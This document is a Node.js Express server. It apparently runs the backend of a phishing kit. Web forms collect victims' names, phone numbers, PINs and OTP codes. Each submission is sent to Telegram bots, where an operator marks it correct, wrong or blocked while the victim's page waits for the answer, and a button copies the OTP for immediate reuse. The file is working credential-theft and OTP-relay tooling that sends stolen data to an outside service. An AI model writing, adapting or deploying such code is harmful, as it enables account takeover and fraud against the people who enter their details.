require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');
if (!DOMAIN) console.warn('⚠️  BACKEND_URL not set — webhooks will fail');

const REQUIRED_UPDATES = ['message', 'callback_query'];
const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
const REQ_TTL_MS = 30 * 60 * 1000;

// ---------- Bots ----------
const bots = [];
Object.keys(process.env).forEach(k => {
  const m = k.match(/^BOT(\d+)_TOKEN$/);
  if (!m) return;
  const i = m[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('🤖 bots loaded:', bots.map(b => b.botId).join(', ') || '(none)');

// ---------- Store ----------
const STORE_FILE = path.join(__dirname, 'data', 'store.json');
fs.mkdirSync(path.dirname(STORE_FILE), { recursive: true });
const store = { requests: {} };

function load() {
  try {
    if (fs.existsSync(STORE_FILE)) {
      const raw = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
      Object.assign(store.requests, raw.requests || {});
      console.log('💾 loaded', Object.keys(store.requests).length, 'requests');
    }
  } catch (e) { console.error('load error:', e.message); }
}
function save() {
  try {
    fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
  } catch (e) { console.error('save error:', e.message); }
}
load();

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, r] of Object.entries(store.requests)) {
    if (now - r.createdAt > REQ_TTL_MS) { delete store.requests[id]; changed = true; }
  }
  if (changed) save();
}, 5 * 60 * 1000);

// ---------- Helpers ----------
const clean = v => String(v == null ? '' : v).replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
const esc = s => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const newId = () => crypto.randomBytes(5).toString('hex');

function getBot(id) { return bots.find(b => b.botId === id); }

function fmt(header, name, phone, extra = []) {
  const lines = [
    `<b>${esc(header)}</b>`,
    SEP,
    `<b>Name:</b>  <b>${esc(name)}</b>`,
    `<b>Phone:</b> <b>${esc(phone)}</b>`,
  ];
  if (extra.length) lines.push(SEP, ...extra);
  lines.push(SEP);
  return lines.join('\n');
}

// ---------- Telegram ----------
async function tg(bot, method, payload) {
  try {
    const { data } = await axios.post(`https://api.telegram.org/bot${bot.token}/${method}`, payload);
    return data;
  } catch (e) {
    console.error(`tg.${method}:`, e.response?.data || e.message);
    return null;
  }
}
const sendMessage  = (bot, text, kb)   => tg(bot, 'sendMessage', { chat_id: bot.chatId, text, parse_mode: 'HTML', reply_markup: kb ? { inline_keyboard: kb } : undefined });
const replyMessage = (bot, to, text)   => tg(bot, 'sendMessage', { chat_id: bot.chatId, text, parse_mode: 'HTML', reply_to_message_id: to, allow_sending_without_reply: true });
const editMessage  = (bot, cid, mid, text) => tg(bot, 'editMessageText', { chat_id: cid, message_id: mid, text, parse_mode: 'HTML', reply_markup: { inline_keyboard: [] } });
const answerCb     = (bot, id, text='') => tg(bot, 'answerCallbackQuery', { callback_query_id: id, text });

// ---------- Webhooks ----------
async function setWebhook(bot) {
  const url = `${DOMAIN}/telegram/${bot.botId}`;

  console.log('🌐 Setting Telegram webhook:', url);

  const r = await tg(bot, 'setWebhook', {
    url,
    allowed_updates: REQUIRED_UPDATES,
    drop_pending_updates: false
  });

  console.log(
    '📡 Telegram setWebhook response:',
    JSON.stringify(r, null, 2)
  );

  if (r?.ok) {
    console.log(`✅ webhook set ${bot.botId} → ${url}`);

    // Diagnostic: ask Telegram what webhook is actually registered
    const info = await tg(bot, 'getWebhookInfo', {});

    console.log(
      `🔎 ${bot.botId} getWebhookInfo:`,
      JSON.stringify(info, null, 2)
    );
  } else {
    console.error(`❌ webhook failed ${bot.botId}`, r);
  }
}
async function initWebhooks() { for (const b of bots) await setWebhook(b); }

// ---------- Middleware ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------- Public routes ----------
app.get('/health',      (_, res) => res.json({ ok: true, bots: bots.map(b => b.botId) }));
app.get('/debug/store', (_, res) => res.json(store));

app.get('/bot/:botId', (req, res) => {
  const b = getBot(req.params.botId);
  if (!b) return res.status(404).send('unknown bot');
  res.redirect(`/index.html?botId=${encodeURIComponent(b.botId)}`);
});

// ---------- Submit ----------
function handleSubmit(type) {
  return (req, res) => {
    const body = req.body || {};
    console.log(`📥 /submit-${type}`, JSON.stringify(body));

    const bot = getBot(body.botId);
    if (!bot) return res.status(400).json({ error: `unknown bot: ${body.botId}` });

    const requestId = newId();
    const rec = { botId: bot.botId, type, name: clean(body.name), phone: clean(body.phone), status: 'pending', createdAt: Date.now() };

    let header, keyboard, extra = [];

    if (type === 'phone') {
      header = '📱 PHONE NUMBER VERIFICATION';
      keyboard = [[
        { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
        { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` },
      ]];
    } else if (type === 'pin') {
      rec.pin = clean(body.pin);
      extra = [`<b>PIN:</b>  <b><code>${esc(rec.pin)}</code></b>`];
      header = '🔐 PIN VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: `pin_ok:${requestId}` }, { text: '❌ Wrong', callback_data: `pin_bad:${requestId}` }],
        [{ text: '🛑 Block',   callback_data: `pin_block:${requestId}` }],
      ];
    } else if (type === 'code') {
      rec.code = clean(body.code);
      extra = [`<b>Code:</b> <b><code>${esc(rec.code)}</code></b>`];
      header = '🔑 OTP CODE VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: `code_ok:${requestId}` }, { text: '❌ Wrong', callback_data: `code_bad:${requestId}` }],
        [{ text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }],
      ];
    }

    store.requests[requestId] = rec;
    save();
    console.log(`📝 stored ${requestId}`, JSON.stringify(rec));

    sendMessage(bot, fmt(header, rec.name, rec.phone, extra), keyboard);
    res.json({ requestId });
  };
}
app.post('/submit-phone', handleSubmit('phone'));
app.post('/submit-pin',   handleSubmit('pin'));
app.post('/submit-code',  handleSubmit('code'));

// ---------- Frontend polling ----------
function handleCheck(req, res) {
  const r = store.requests[req.params.requestId];
  if (!r) return res.json({ approved: null });
  const map = {
    pending:  { approved: null },
    approved: { approved: true },
    rejected: { approved: false },
    wrong:    { approved: false },
    blocked:  { approved: false, blocked: true },
  };
  res.json(map[r.status] || { approved: null });
}
app.get('/check-phone/:requestId', handleCheck);
app.get('/check-pin/:requestId',   handleCheck);
app.get('/check-code/:requestId',  handleCheck);

// ---------- Telegram webhook ----------
// ---------- Telegram webhook ----------

app.get('/telegram/:botId', (req, res) => {
  console.log('🧪 TELEGRAM GET TEST:', req.params.botId);

  res.json({
    ok: true,
    route: `/telegram/${req.params.botId}`
  });
});

app.post('/telegram/:botId', async (req, res) => {
  console.log('🚨 TELEGRAM WEBHOOK RECEIVED');
  console.log('botId:', req.params.botId);
  console.log('body:', JSON.stringify(req.body));

  res.sendStatus(200);

  // ...the rest of your existing code...
  try {
    const bot = getBot(req.params.botId);
    if (!bot) return console.log('❌ webhook unknown bot', req.params.botId);

    const cb = req.body.callback_query;
    if (!cb) return;

    const data = cb.data || '';
    const i = data.indexOf(':');
    if (i < 0) return console.log('⚠️ bad callback:', data);

    const action = data.slice(0, i);
    const requestId = data.slice(i + 1);
    console.log(`🔘 callback ${action} for ${requestId}`);

    const rec = store.requests[requestId];

console.log('🔎 CALLBACK DEBUG');
console.log('botId:', bot.botId);
console.log('action:', action);
console.log('requestId:', requestId);
console.log('record:', rec);
    if (!rec) {
      console.log(`⚠️ no request ${requestId} (expired or server restarted)`);
      await answerCb(bot, cb.id, 'This request has expired.');
      return;
    }

    if (action === 'code_copy') {
      await answerCb(bot, cb.id, 'Sent for copying');
      const payload = `<code>${esc(rec.code || '')}</code>`;
      if (cb.message?.message_id) await replyMessage(bot, cb.message.message_id, payload);
      else await sendMessage(bot, payload);
      return;
    }

    let status, feedback;
    switch (action) {
      case 'phone_ok':  status = 'approved'; feedback = 'Approved ✅';       break;
      case 'phone_bad': status = 'rejected'; feedback = 'Rejected ❌';       break;
      case 'pin_ok':    status = 'approved'; feedback = 'Correct ✅';        break;
      case 'pin_bad':   status = 'wrong';    feedback = 'Wrong ❌';          break;
      case 'pin_block': status = 'blocked';  feedback = 'User blocked 🛑';   break;
      case 'code_ok':   status = 'approved'; feedback = 'Correct ✅';        break;
      case 'code_bad':  status = 'wrong';    feedback = 'Wrong ❌';          break;
      default:
        console.log('⚠️ unknown action:', action);
        return answerCb(bot, cb.id, 'Unknown action');
    }

    rec.status = status;
    rec.updatedAt = Date.now();
    save();
    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${status}`);

    await answerCb(bot, cb.id, feedback);

    // Rebuild from the SAME record — never from callback_data
    const headers = { phone: '📱 PHONE NUMBER VERIFICATION', pin: '🔐 PIN VERIFICATION', code: '🔑 OTP CODE VERIFICATION' };
    const extra = [];
    if (rec.type === 'pin')  extra.push(`<b>PIN:</b>  <b><code>${esc(rec.pin || '')}</code></b>`);
    if (rec.type === 'code') extra.push(`<b>Code:</b> <b><code>${esc(rec.code || '')}</code></b>`);
    extra.push(`<b>Status:</b> ${feedback}`);

    const newText = fmt(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);

    if (cb.message?.message_id) await editMessage(bot, cb.message.chat.id, cb.message.message_id, newText);
    await sendMessage(bot, fmt(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone));
  } catch (e) {
    console.error('webhook error:', e.message);
  }
});

// ---------- Start ----------
(async () => {
  console.log('🚀 starting, DOMAIN =', DOMAIN);
  await initWebhooks();
  app.listen(PORT, () => console.log(`🚀 listening on ${PORT}`));
})();